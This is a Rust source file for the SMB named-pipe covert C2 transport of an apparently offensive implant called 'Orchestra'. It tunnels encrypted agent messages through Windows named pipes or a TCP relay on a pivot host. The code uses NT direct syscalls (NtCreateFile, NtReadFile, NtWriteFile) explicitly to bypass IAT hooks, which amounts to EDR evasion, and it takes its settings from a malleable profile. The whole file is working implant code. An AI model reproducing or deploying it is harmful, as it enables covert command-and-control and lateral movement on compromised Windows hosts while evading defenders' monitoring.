//! SMB / TCP named-pipe covert transport for the Orchestra agent.
//!
//! # Status: EXPERIMENTAL — not recommended for production use.
//! Enabled only when built with `--features smb-pipe-transport`.
//!
//! This module implements a [`Transport`] that tunnels agent messages through
//! a Windows named pipe.  Two operating modes are supported:
//!
//! * **`smb`** (default) — connects to `\\<host>\pipe\<name>` over SMB.
//! * **`tcp_relay`** — connects to `localhost:<port>` via TCP; a relay on the
//!   pivot host bridges the TCP socket to the named pipe.
//!
//! ## Framing
//!
//! The wire protocol is identical to [`TcpTransport`]: every message is
//! encrypted with [`CryptoSession`] and wrapped in a 4-byte little-endian
//! length prefix:
//!
//! ```text
//! [ 4 bytes: payload length (u32, LE) ] [ encrypted bytes ]
//! ```
//!
//! ## NT direct syscalls
//!
//! On Windows, `NtCreateFile`, `NtReadFile`, `NtWriteFile`, and `NtClose`
//! go through the `nt_syscall` crate to bypass IAT hooks.  `WaitNamedPipe`
//! uses the Win32 API since it is not security-sensitive.
//!
//! ## Reconnection
//!
//! `SmbPipeTransport` does not reconnect internally.  Errors from `send` or
//! `recv` propagate to `outbound::run_forever`, which restarts the entire
//! transport stack with exponential back-off.
//!
//! ## Retry on `ERROR_PIPE_BUSY`
//!
//! If the pipe is busy when connecting, the transport retries with exponential
//! back-off (1 s initial, 30 s max, with jitter) up to a configurable limit.

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use common::config::MalleableProfile;
use common::{CryptoSession, Message, Transport};
use log::info;
#[cfg(windows)]
use log::warn;
#[cfg(windows)]
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

const MAX_FRAME_BYTES: u32 = 16 * 1024 * 1024; // 16 MiB hard cap

/// Default initial retry delay when `ERROR_PIPE_BUSY` is encountered.
#[cfg(windows)]
const RETRY_INITIAL_SECS: u64 = 1;
/// Maximum retry delay (cap for exponential back-off).
#[cfg(windows)]
const RETRY_MAX_SECS: u64 = 30;
/// Maximum number of connection retries on `ERROR_PIPE_BUSY`.
#[cfg(windows)]
const MAX_PIPE_BUSY_RETRIES: u32 = 10;

// ─── Windows NT syscall helpers ──────────────────────────────────────────────

#[cfg(windows)]
mod nt_pipe {
    use super::*;
    use std::io;
    use std::sync::Mutex;

    const STATUS_PENDING: i32 = 0x00000103;
    const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
    const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
    const FILE_OPEN: u32 = 1;
    const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
    const SYNCHRONIZE: u32 = 0x00100000;
    const GENERIC_READ: u32 = 0x80000000;
    const GENERIC_WRITE: u32 = 0x40000000;

    /// Build a Windows NT UNICODE_STRING on the stack.
    unsafe fn init_unicode_string(
        dest: &mut winapi::shared::ntdef::UNICODE_STRING,
        s: &[u16],
    ) {
        dest.Buffer = s.as_ptr() as *mut _;
        dest.Length = (s.len() * 2) as u16;
        dest.MaximumLength = dest.Length;
    }

    /// Open a named pipe via `NtCreateFile` (NT direct syscall).
    /// Returns a valid `HANDLE` on success.
    pub unsafe fn open_pipe(pipe_path: &str) -> Result<*mut std::ffi::c_void> {
        // Convert Win32 path (\\host\pipe\name) to NT path (\??\UNC\host\pipe\name).
        let nt_path_str = if pipe_path.starts_with(r"\\") {
            format!(r"\??\UNC\{}", &pipe_path[2..])
        } else {
            format!(r"\??\{}", pipe_path)
        };
        let nt_wide: Vec<u16> = nt_path_str.encode_utf16().chain(std::iter::once(0)).collect();

        let mut name_str: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        unsafe { init_unicode_string(&mut name_str, &nt_wide) };

        let mut obj_attrs: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attrs.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attrs.ObjectName = &mut name_str;
        obj_attrs.Attributes = OBJ_CASE_INSENSITIVE;

        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
        let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();

        let status = nt_syscall::syscall!(
            "NtCreateFile",
            &mut handle as *mut _ as u64,
            (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64,
            &mut obj_attrs as *mut _ as u64,
            &mut iosb as *mut _ as u64,
            0u64,
            0u64,
            0u64,
            FILE_OPEN as u64,
            (FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE) as u64,
            0u64,
            0u64,
        )
        .map_err(|e| anyhow!("nt_syscall resolution for NtCreateFile: {e}"))?;

        if status < 0 {
            return Err(anyhow!(
                "NtCreateFile failed for '{pipe_path}': NTSTATUS {:#010X}",
                status as u32
            ));
        }
        Ok(handle)
    }

    /// Read bytes from a file handle via `NtReadFile` (NT direct syscall).
    pub unsafe fn read_file(
        handle: *mut std::ffi::c_void,
        buf: &mut [u8],
    ) -> Result<usize> {
        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
        let status = nt_syscall::syscall!(
            "NtReadFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            buf.as_mut_ptr() as u64,
            buf.len() as u64,
            std::ptr::null::<i64>() as u64,
            0u64,
        )
        .map_err(|e| anyhow!("nt_syscall resolution for NtReadFile: {e}"))?;

        if status < 0 && status != STATUS_PENDING {
            return Err(anyhow!(
                "NtReadFile failed: NTSTATUS {:#010X}",
                status as u32
            ));
        }
        Ok(iosb.Information as usize)
    }

    /// Write bytes to a file handle via `NtWriteFile` (NT direct syscall).
    pub unsafe fn write_file(
        handle: *mut std::ffi::c_void,
        buf: &[u8],
    ) -> Result<usize> {
        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
        let status = nt_syscall::syscall!(
            "NtWriteFile",
            handle as u64,
            0u64,
            0u64,
            0u64,
            &mut iosb as *mut _ as u64,
            buf.as_ptr() as u64,
            buf.len() as u64,
            std::ptr::null::<i64>() as u64,
            0u64,
        )
        .map_err(|e| anyhow!("nt_syscall resolution for NtWriteFile: {e}"))?;

        if status < 0 && status != STATUS_PENDING {
            return Err(anyhow!(
                "NtWriteFile failed: NTSTATUS {:#010X}",
                status as u32
            ));
        }
        Ok(iosb.Information as usize)
    }

    /// Close a handle via `NtClose` (NT direct syscall).
    pub unsafe fn close_handle(handle: *mut std::ffi::c_void) -> Result<()> {
        let status = nt_syscall::syscall!("NtClose", handle as u64)
            .map_err(|e| anyhow!("nt_syscall resolution for NtClose: {e}"))?;
        if status < 0 {
            return Err(anyhow!("NtClose failed: NTSTATUS {:#010X}", status as u32));
        }
        Ok(())
    }

    /// Use Win32 `WaitNamedPipeW` to wait for a pipe to become available.
    pub fn wait_named_pipe(pipe_path: &str, timeout_ms: u32) -> Result<()> {
        let wide: Vec<u16> = pipe_path.encode_utf16().chain(std::iter::once(0)).collect();
        let ok = unsafe {
            winapi::um::namedpipeapi::WaitNamedPipeW(wide.as_ptr() as *const _, timeout_ms)
        };
        if ok == 0 {
            let err = io::Error::last_os_error();
            Err(anyhow!("WaitNamedPipe failed for '{pipe_path}': {err}"))
        } else {
            Ok(())
        }
    }

    /// Check whether a Win32 error code indicates the pipe is busy.
    pub fn is_pipe_busy_error(win32_error: i32) -> bool {
        const ERROR_PIPE_BUSY: i32 = 231;
        win32_error == ERROR_PIPE_BUSY
    }

    /// Extract the Win32 error code from the last OS error.
    pub fn last_win32_error() -> i32 {
        std::io::Error::last_os_error().raw_os_error().unwrap_or(0)
    }

    /// Synchronous named-pipe I/O wrapper.  Uses NT direct syscalls for all
    /// read/write/close operations.  Thread-safe via Mutex to serialize
    /// access to the pipe handle.
    pub struct NtPipeHandle {
        handle: Mutex<*mut std::ffi::c_void>,
    }

    // SAFETY: The handle is protected by a Mutex; NT handles are thread-safe.
    unsafe impl Send for NtPipeHandle {}
    unsafe impl Sync for NtPipeHandle {}

    impl NtPipeHandle {
        pub fn new(handle: *mut std::ffi::c_void) -> Self {
            Self {
                handle: Mutex::new(handle),
            }
        }

        /// Read exactly `buf.len()` bytes from the pipe.
        pub fn read_exact(&self, buf: &mut [u8]) -> Result<()> {
            let handle = *self.handle.lock().unwrap();
            let mut filled = 0;
            while filled < buf.len() {
                let n = unsafe { read_file(handle, &mut buf[filled..])? };
                if n == 0 {
                    return Err(anyhow!("smb-pipe: EOF while reading from pipe"));
                }
                filled += n;
            }
            Ok(())
        }

        /// Write all bytes to the pipe.
        pub fn write_all(&self, buf: &[u8]) -> Result<()> {
            let handle = *self.handle.lock().unwrap();
            let mut written = 0;
            while written < buf.len() {
                let n = unsafe { write_file(handle, &buf[written..])? };
                if n == 0 {
                    return Err(anyhow!("smb-pipe: write returned 0 bytes"));
                }
                written += n;
            }
            Ok(())
        }
    }

    impl Drop for NtPipeHandle {
        fn drop(&mut self) {
            let handle = *self.handle.lock().unwrap();
            if !handle.is_null() {
                let _ = unsafe { close_handle(handle) };
            }
        }
    }
}

// ─── SmbPipeTransport ────────────────────────────────────────────────────────

/// Named-pipe C2 transport.
///
/// Two modes:
/// - **SMB mode** (Windows only): Opens a named pipe via NT direct syscalls
///   and performs blocking I/O on `spawn_blocking` threads, bridging to
///   async via the tokio runtime.
/// - **TCP relay mode** (any OS): Connects to `localhost:<port>` via a
///   standard `tokio::net::TcpStream`.  A relay on the pivot host bridges
///   to the named pipe.
///
/// Both modes use the standard Orchestra framing: 4-byte LE length prefix
/// followed by AES-256-GCM-encrypted message bytes.
pub enum SmbPipeTransport {
    /// Direct SMB named-pipe connection using NT syscalls (Windows only).
    #[cfg(windows)]
    Pipe {
        pipe: std::sync::Arc<nt_pipe::NtPipeHandle>,
        session: CryptoSession,
    },
    /// TCP relay to a local named-pipe forwarder.
    Relay {
        stream: TcpStream,
        session: CryptoSession,
    },
}

impl SmbPipeTransport {
    /// Create a new SMB pipe transport.
    ///
    /// Reads configuration from `MalleableProfile`:
    /// - `smb_pipe_host` — target host (required)
    /// - `smb_pipe_name` — pipe name (defaults to "orchestra")
    /// - `smb_pipe_mode` — "smb" or "tcp_relay" (defaults to "smb")
    /// - `smb_tcp_relay_port` — TCP relay port (defaults to 4455)
    pub async fn new(
        profile: &MalleableProfile,
        session: CryptoSession,
    ) -> Result<Self> {
        let host = profile
            .smb_pipe_host
            .as_deref()
            .ok_or_else(|| anyhow!("smb_pipe_host is required when smb_pipe_enabled is true"))?;

        let pipe_name = profile
            .smb_pipe_name
            .as_deref()
            .unwrap_or("orchestra");

        let mode = profile
            .smb_pipe_mode
            .as_deref()
            .unwrap_or("smb");

        let tcp_relay_port = profile
            .smb_tcp_relay_port
            .unwrap_or(4455);

        match mode {
            "tcp_relay" => {
                info!("smb-pipe: using tcp_relay mode, connecting to localhost:{tcp_relay_port}");
                let stream = TcpStream::connect(format!("127.0.0.1:{tcp_relay_port}")).await?;
                stream.set_nodelay(true)?;
                Ok(Self::Relay { stream, session })
            }
            _ => {
                Self::connect_smb_pipe(host, pipe_name, session).await
            }
        }
    }

    /// Connect to a named pipe via SMB using NT direct syscalls with retry.
    #[cfg(windows)]
    async fn connect_smb_pipe(
        host: &str,
        pipe_name: &str,
        session: CryptoSession,
    ) -> Result<Self> {
        let pipe_path = format!(r"\\{host}\pipe\{pipe_name}");
        info!("smb-pipe: connecting to {pipe_path}");

        let mut attempt = 0u32;
        let mut delay = Duration::from_secs(RETRY_INITIAL_SECS);

        loop {
            attempt += 1;

            match unsafe { nt_pipe::open_pipe(&pipe_path) } {
                Ok(handle) => {
                    info!("smb-pipe: pipe opened successfully on attempt {attempt}");
                    let pipe = std::sync::Arc::new(nt_pipe::NtPipeHandle::new(handle));
                    return Ok(Self::Pipe { pipe, session });
                }
                Err(e) => {
                    let win_err = nt_pipe::last_win32_error();
                    if nt_pipe::is_pipe_busy_error(win_err)
                        && attempt <= MAX_PIPE_BUSY_RETRIES
                    {
                        warn!(
                            "smb-pipe: pipe busy on attempt {attempt}/{MAX_PIPE_BUSY_RETRIES}, \
                             retrying in {delay:?}"
                        );

                        // WaitNamedPipe uses Win32 API — acceptable per spec.
                        let timeout_ms = delay.as_millis() as u32;
                        let _ = nt_pipe::wait_named_pipe(&pipe_path, timeout_ms);

                        tokio::time::sleep(delay).await;

                        // Exponential back-off with jitter.
                        let jitter = Duration::from_millis(
                            (rand::random::<f64>() * 500.0) as u64,
                        );
                        delay = ((delay * 2) + jitter)
                            .min(Duration::from_secs(RETRY_MAX_SECS));
                    } else {
                        return Err(anyhow!(
                            "smb-pipe: failed to open pipe '{pipe_path}' after \
                             {attempt} attempt(s): {e}"
                        ));
                    }
                }
            }
        }
    }

    /// Connect to a named pipe via SMB — non-Windows stub.
    #[cfg(not(windows))]
    async fn connect_smb_pipe(
        _host: &str,
        _pipe_name: &str,
        _session: CryptoSession,
    ) -> Result<Self> {
        Err(anyhow!(
            "smb-pipe: SMB direct mode is only supported on Windows; \
             use tcp_relay mode on this platform"
        ))
    }
}

#[async_trait]
impl Transport for SmbPipeTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        match self {
            Self::Relay { stream, session } => {
                let plain = bincode::serialize(&msg)?;
                let enc = session.encrypt(&plain);
                stream.write_u32_le(enc.len() as u32).await?;
                stream.write_all(&enc).await?;
                Ok(())
            }
            #[cfg(windows)]
            Self::Pipe { pipe, session } => {
                let plain = bincode::serialize(&msg)?;
                let enc = session.encrypt(&plain);
                let len_bytes = (enc.len() as u32).to_le_bytes();

                let pipe_c = pipe.clone();
                tokio::task::spawn_blocking(move || {
                    pipe_c.write_all(&len_bytes)?;
                    pipe_c.write_all(&enc)
                })
                .await
                .map_err(|e| anyhow!("smb-pipe: send task panicked: {e}"))??;

                Ok(())
            }
        }
    }

    async fn recv(&mut self) -> Result<Message> {
        match self {
            Self::Relay { stream, session } => {
                let len = stream.read_u32_le().await?;
                if len > MAX_FRAME_BYTES {
                    anyhow::bail!("smb-pipe: frame too large: {len} bytes");
                }
                let mut buf = vec![0u8; len as usize];
                stream.read_exact(&mut buf).await?;
                let plain = session
                    .decrypt(&buf)
                    .map_err(|e| anyhow!("smb-pipe: decrypt failed: {e:?}"))?;
                Ok(bincode::deserialize(&plain)?)
            }
            #[cfg(windows)]
            Self::Pipe { pipe, session } => {
                let len = {
                    let pipe_c = pipe.clone();
                    tokio::task::spawn_blocking(move || {
                        let mut len_buf = [0u8; 4];
                        pipe_c.read_exact(&mut len_buf)?;
                        Ok::<u32, anyhow::Error>(u32::from_le_bytes(len_buf))
                    })
                    .await
                    .map_err(|e| anyhow!("smb-pipe: recv (length) task panicked: {e}"))??
                };

                if len > MAX_FRAME_BYTES {
                    anyhow::bail!("smb-pipe: frame too large: {len} bytes");
                }

                let buf = {
                    let pipe_c = pipe.clone();
                    tokio::task::spawn_blocking(move || {
                        let mut buf = vec![0u8; len as usize];
                        pipe_c.read_exact(&mut buf)?;
                        Ok::<Vec<u8>, anyhow::Error>(buf)
                    })
                    .await
                    .map_err(|e| anyhow!("smb-pipe: recv (payload) task panicked: {e}"))??
                };

                let plain = session
                    .decrypt(&buf)
                    .map_err(|e| anyhow!("smb-pipe: decrypt failed: {e:?}"))?;
                Ok(bincode::deserialize(&plain)?)
            }
        }
    }
}
